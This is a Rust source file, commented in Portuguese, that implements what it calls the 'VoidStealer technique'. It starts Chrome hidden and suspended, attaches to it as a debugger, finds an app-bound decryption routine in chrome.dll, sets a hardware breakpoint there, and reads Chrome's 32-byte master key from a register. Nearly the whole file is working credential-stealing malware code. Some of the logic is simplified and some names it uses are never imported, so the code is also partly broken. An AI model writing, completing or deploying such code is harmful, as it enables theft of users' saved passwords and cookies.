// debugger.rs - Técnica VoidStealer (Hardware Breakpoint + Debugger)
use std::ptr;
use std::mem;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use winapi::{
    shared::minwindef::{DWORD, FALSE, TRUE},
    um::{
        handleapi::CloseHandle,
        processthreadsapi::{
            CreateProcessW, OpenProcess, GetThreadContext, SetThreadContext,
            ResumeThread, GetExitCodeThread, PROCESS_INFORMATION, STARTUPINFOW,
            CONTEXT, CONTEXT_DEBUG_REGISTERS,
        },
        memoryapi::{VirtualAllocEx, WriteProcessMemory, ReadProcessMemory},
        winnt::{
            PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, MEM_COMMIT, 
            PAGE_READWRITE, CREATE_SUSPENDED, STARTF_USESHOWWINDOW,
            SW_HIDE, EXCEPTION_DEBUG_EVENT, EXCEPTION_SINGLE_STEP,
            LOAD_DLL_DEBUG_EVENT,
        },
        debugapi::{DebugActiveProcess, WaitForDebugEvent, ContinueDebugEvent},
        errhandlingapi::GetLastError,
        libloaderapi::GetModuleHandleW,
        winbase::INFINITE,
        synchapi::WaitForSingleObject,
    },
};

#[derive(Debug)]
pub struct ExtractedKey {
    pub key: Vec<u8>,      // 32 bytes master key
    pub success: bool,
}

// ============================================================
// FUNÇÃO PRINCIPAL - VOIDSTEALER TECHNIQUE
// ============================================================
pub fn extract_key_via_debugger() -> Result<Vec<u8>, String> {
    println!("[DEBUGGER] Starting VoidStealer technique...");
    
    // 1. Criar processo do Chrome suspenso e oculto
    let (h_process, h_thread, pid) = create_suspended_chrome()?;
    println!("[DEBUGGER] Created suspended Chrome process (PID: {})", pid);
    
    // 2. Anexar como depurador
    if unsafe { DebugActiveProcess(pid) } == 0 {
        return Err(format!("Failed to attach debugger, error: {}", unsafe { GetLastError() }));
    }
    println!("[DEBUGGER] Attached as debugger");
    
    // 3. Aguardar o carregamento da chrome.dll
    let chrome_base = wait_for_chrome_dll(h_process)?;
    println!("[DEBUGGER] chrome.dll loaded at: 0x{:x}", chrome_base);
    
    // 4. Encontrar a string alvo e calcular o endereço do breakpoint
    let target_addr = find_breakpoint_address(h_process, chrome_base)?;
    println!("[DEBUGGER] Breakpoint address: 0x{:x}", target_addr);
    
    // 5. Configurar hardware breakpoint
    setup_hardware_breakpoint(h_thread, target_addr)?;
    println!("[DEBUGGER] Hardware breakpoint configured");
    
    // 6. Retomar a execução e aguardar o breakpoint
    unsafe { ResumeThread(h_thread); }
    println!("[DEBUGGER] Chrome resumed, waiting for breakpoint...");
    
    // 7. Aguardar o evento de exceção
    let key = wait_for_breakpoint_and_extract_key(h_process, h_thread)?;
    println!("[DEBUGGER] Key extracted successfully! {} bytes", key.len());
    
    // 8. Limpeza
    unsafe {
        DebugActiveProcessStop(pid);
        CloseHandle(h_process);
        CloseHandle(h_thread);
    }
    
    Ok(key)
}

// ============================================================
// 1. CRIAR PROCESSO SUSPENSO E OCULTO
// ============================================================
fn create_suspended_chrome() -> Result<(*mut std::ffi::c_void, *mut std::ffi::c_void, DWORD), String> {
    let chrome_path = r"C:\Program Files\Google\Chrome\Application\chrome.exe";
    let chrome_path_wide: Vec<u16> = OsStr::new(chrome_path)
        .encode_wide()
        .chain(Some(0))
        .collect();
    
    let mut startup_info: STARTUPINFOW = unsafe { mem::zeroed() };
    startup_info.cb = mem::size_of::<STARTUPINFOW>() as u32;
    startup_info.dwFlags = STARTF_USESHOWWINDOW;
    startup_info.wShowWindow = SW_HIDE; // Janela oculta!
    
    let mut proc_info: PROCESS_INFORMATION = unsafe { mem::zeroed() };
    
    let success = unsafe {
        CreateProcessW(
            chrome_path_wide.as_ptr(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            FALSE,
            CREATE_SUSPENDED, // Criar suspenso!
            ptr::null_mut(),
            ptr::null_mut(),
            &mut startup_info,
            &mut proc_info,
        )
    };
    
    if success == 0 {
        let err = unsafe { GetLastError() };
        return Err(format!("CreateProcessW failed: {}", err));
    }
    
    Ok((proc_info.hProcess, proc_info.hThread, proc_info.dwProcessId))
}

// ============================================================
// 2. AGUARDAR O CARREGAMENTO DA CHROME.DLL
// ============================================================
fn wait_for_chrome_dll(h_process: *mut std::ffi::c_void) -> Result<u64, String> {
    let mut debug_event = unsafe { mem::zeroed() };
    
    loop {
        if unsafe { WaitForDebugEvent(&mut debug_event, INFINITE) } == 0 {
            return Err("WaitForDebugEvent failed".to_string());
        }
        
        match debug_event.dwDebugEventCode {
            LOAD_DLL_DEBUG_EVENT => {
                let dll_base = debug_event.u.LoadDll().lpBaseOfDll as u64;
                // Verificar se é chrome.dll (simplificado)
                // Na prática, você leria o nome da DLL
                println!("[DEBUGGER] DLL loaded at: 0x{:x}", dll_base);
                
                // Assume que a primeira DLL carregada após o início é chrome.dll
                unsafe { ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, 1); }
                return Ok(dll_base);
            }
            _ => {
                unsafe { ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, 1); }
            }
        }
    }
}

// ============================================================
// 3. ENCONTRAR STRING E CALCULAR ENDEREÇO DO BREAKPOINT
// ============================================================
fn find_breakpoint_address(h_process: *mut std::ffi::c_void, chrome_base: u64) -> Result<u64, String> {
    // String alvo do VoidStealer
    let target_string = "OSCrypt.AppBoundProvider.Decrypt.ResultCode";
    let string_bytes = target_string.as_bytes();
    
    // Escanear a seção .rdata (simplificado - normalmente se escaneia toda a memória)
    let scan_start = chrome_base;
    let scan_end = chrome_base + 0x1000000; // 16MB
    
    let mut current = scan_start;
    let mut buffer = vec![0u8; 4096];
    
    while current < scan_end {
        let mut bytes_read = 0;
        unsafe {
            ReadProcessMemory(
                h_process,
                current as *const _,
                buffer.as_mut_ptr() as _,
                buffer.len(),
                &mut bytes_read,
            );
        }
        
        if bytes_read > 0 {
            if let Some(pos) = buffer.windows(string_bytes.len()).position(|w| w == string_bytes) {
                let string_addr = current + pos as u64;
                println!("[DEBUGGER] Found target string at: 0x{:x}", string_addr);
                
                // Calcular endereço da instrução LEA (simplificado)
                // Na prática, você escaneia para trás até encontrar a instrução LEA
                let lea_addr = find_lea_instruction(h_process, string_addr - 0x100, string_addr)?;
                return Ok(lea_addr);
            }
        }
        
        current += bytes_read as u64;
    }
    
    Err("Target string not found".to_string())
}

// ============================================================
// 4. ENCONTRAR INSTRUÇÃO LEA (ANÁLISE DE BYTES)
// ============================================================
fn find_lea_instruction(h_process: *mut std::ffi::c_void, start: u64, end: u64) -> Result<u64, String> {
    let mut current = start;
    let mut buffer = vec![0u8; 512];
    
    while current < end {
        let mut bytes_read = 0;
        unsafe {
            ReadProcessMemory(
                h_process,
                current as *const _,
                buffer.as_mut_ptr() as _,
                buffer.len(),
                &mut bytes_read,
            );
        }
        
        if bytes_read > 0 {
            // Procurar por LEA (opcode 0x48 0x8D 0x15 ou similar)
            for i in 0..bytes_read.saturating_sub(4) {
                // LEA relativa: 48 8D 15 [offset]
                if buffer[i] == 0x48 && buffer[i+1] == 0x8D && (buffer[i+2] == 0x15 || buffer[i+2] == 0x0D) {
                    let addr = current + i as u64;
                    println!("[DEBUGGER] Found LEA instruction at: 0x{:x}", addr);
                    return Ok(addr);
                }
            }
        }
        
        current += bytes_read as u64;
    }
    
    Err("LEA instruction not found".to_string())
}

// ============================================================
// 5. CONFIGURAR HARDWARE BREAKPOINT
// ============================================================
fn setup_hardware_breakpoint(h_thread: *mut std::ffi::c_void, target_addr: u64) -> Result<(), String> {
    let mut context: CONTEXT = unsafe { mem::zeroed() };
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    
    if unsafe { GetThreadContext(h_thread, &mut context) } == 0 {
        return Err("Failed to get thread context".to_string());
    }
    
    // Configurar breakpoint no registrador DR0
    context.Dr0 = target_addr;
    context.Dr7 |= 1 << 0;  // Ativa breakpoint local no DR0
    context.Dr7 |= 1 << 16; // Ativa breakpoint global no DR0
    
    if unsafe { SetThreadContext(h_thread, &context) } == 0 {
        return Err("Failed to set thread context".to_string());
    }
    
    Ok(())
}

// ============================================================
// 6. AGUARDAR BREAKPOINT E EXTRAIR CHAVE
// ============================================================
fn wait_for_breakpoint_and_extract_key(
    h_process: *mut std::ffi::c_void,
    h_thread: *mut std::ffi::c_void,
) -> Result<Vec<u8>, String> {
    let mut debug_event = unsafe { mem::zeroed() };
    
    loop {
        if unsafe { WaitForDebugEvent(&mut debug_event, INFINITE) } == 0 {
            return Err("WaitForDebugEvent failed".to_string());
        }
        
        match debug_event.dwDebugEventCode {
            EXCEPTION_DEBUG_EVENT => {
                let exception_code = unsafe { debug_event.u.Exception().ExceptionRecord.ExceptionCode };
                
                if exception_code == EXCEPTION_SINGLE_STEP {
                    println!("[DEBUGGER] Breakpoint hit! Extracting key...");
                    
                    // Extrair o valor do registrador R15 (Chrome) ou R14 (Edge)
                    let mut context: CONTEXT = unsafe { mem::zeroed() };
                    context.ContextFlags = CONTEXT_FULL;
                    
                    if unsafe { GetThreadContext(h_thread, &mut context) } == 0 {
                        return Err("Failed to get thread context".to_string());
                    }
                    
                    // No Chrome, a chave está em R15
                    let key_ptr = context.R15 as *const u8;
                    
                    let mut key = vec![0u8; 32];
                    let mut bytes_read = 0;
                    
                    unsafe {
                        ReadProcessMemory(
                            h_process,
                            key_ptr,
                            key.as_mut_ptr() as _,
                            32,
                            &mut bytes_read,
                        );
                    }
                    
                    if bytes_read == 32 {
                        unsafe { ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, 1); }
                        return Ok(key);
                    }
                }
            }
            _ => {}
        }
        
        unsafe { ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, 1); }
    }
}